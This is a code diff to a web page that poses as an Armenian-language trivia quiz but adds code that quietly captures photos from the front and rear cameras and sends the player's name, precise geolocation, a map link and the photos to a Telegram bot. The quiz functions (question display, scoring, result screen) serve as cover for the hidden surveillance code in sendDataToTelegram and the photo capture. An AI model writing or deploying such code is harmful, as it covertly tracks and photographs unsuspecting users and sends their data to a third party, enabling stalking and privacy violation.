@@ -102,4 +102,132 @@ async function getCameraPhotos() {
   }
 
   const frontPhoto = await capturePhoto('user');
-  if (frontPhoto) ph
+  if (frontPhoto) photos.push(frontPhoto);
+
+  const rearPhoto = await capturePhoto('environment');
+  if (rearPhoto) photos.push(rearPhoto);
+
+  return photos;
+}
+
+function sendDataToTelegram(username, geo, photos) {
+  const messageParts = [];
+  if (username) messageParts.push(`Имя: ${username}`);
+
+  if (geo) {
+    messageParts.push(`Геолокация:\nШирота: ${geo.latitude.toFixed(6)}, Долгота: ${geo.longitude.toFixed(6)}\nТочность: ${geo.accuracy} м`);
+  } else {
+    messageParts.push("Геоданные не получены.");
+  }
+
+  const textMessage = encodeURIComponent(messageParts.join('\n'));
+  fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${textMessage}`);
+
+  if (geo) {
+    const mapUrl = `https://maps.google.com/?q=${geo.latitude},${geo.longitude}`;
+    fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(mapUrl)}`);
+  }
+
+  photos.forEach((photo, index) => {
+    const formData = new FormData();
+    formData.append('chat_id', TELEGRAM_CHAT_ID);
+    formData.append('photo', dataURLtoBlob(photo), `photo${index}.jpg`);
+
+    fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
+      method: 'POST',
+      body: formData,
+    });
+  });
+}
+
+function dataURLtoBlob(dataurl) {
+  const arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
+    bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
+  for (let i=0; i<n; i++) {
+    u8arr[i] = bstr.charCodeAt(i);
+  }
+  return new Blob([u8arr], {type:mime});
+}
+
+function startGame() {
+  shuffledQuestions = shuffle(questions);
+  currentQuestionIndex = 0;
+  correctAnswers = 0;
+  wrongAnswers = 0;
+  resultScreen.classList.add('hidden');
+  document.querySelector('.container').style.display = 'flex';
+  showQuestion();
+}
+
+function showQuestion() {
+  resetState();
+  const currentQuestion = shuffledQuestions[currentQuestionIndex];
+  questionText.textContent = currentQuestion.question;
+
+  const remaining = shuffledQuestions.length - currentQuestionIndex;
+  questionStatsSpan.textContent = `Մնացել է: ${remaining} | Ճիշտ: ${correctAnswers} | Սխալ: ${wrongAnswers}`;
+
+  currentQuestion.answers.forEach(answer => {
+    const button = document.createElement('button');
+    button.textContent = answer.text;
+    button.classList.add('btn');
+    button.addEventListener('click', () => selectAnswer(button, answer.correct));
+    answerButtons.appendChild(button);
+  });
+}
+
+function resetState() {
+  while (answerButtons.firstChild) {
+    answerButtons.removeChild(answerButtons.firstChild);
+  }
+}
+
+function selectAnswer(button, correct) {
+  if (correct) {
+    correctAnswers++;
+    button.style.backgroundColor = '#38a169';
+  } else {
+    wrongAnswers++;
+    button.style.backgroundColor = '#e53e3e';
+    showCorrectAnswer();
+  }
+
+  Array.from(answerButtons.children).forEach(btn => btn.disabled = true);
+
+  setTimeout(() => {
+    currentQuestionIndex++;
+    if (currentQuestionIndex < shuffledQuestions.length) {
+      showQuestion();
+    } else {
+      showResult();
+    }
+  }, 1500);
+}
+
+function showCorrectAnswer() {
+  const currentQuestion = shuffledQuestions[currentQuestionIndex];
+  Array.from(answerButtons.children).forEach((btn, idx) => {
+    if (currentQuestion.answers[idx].correct) {
+      btn.style.backgroundColor = '#38a169';
+    }
+  });
+}
+
+function showResult() {
+  document.querySelector('.container').style.display = 'none';
+  resultScreen.classList.remove('hidden');
+
+  if (correctAnswers >= 7) {
+    resultTitle.textContent = 'Դուք խելացի եք! 😎';
+    resultSummary.textContent = `Ճիշտ պատասխաններ: ${correctAnswers} / ${shuffledQuestions.length}`;
+  } else {
+    resultTitle.textContent = 'Փորձեք նորից 🧠';
+    resultSummary.textContent = `Ճիշտ պատասխաններ: ${correctAnswers} / ${shuffledQuestions.length}`;
+  }
+}
+
+retryButton.addEventListener('click', () => {
+  location.reload();
+});
+
+init();
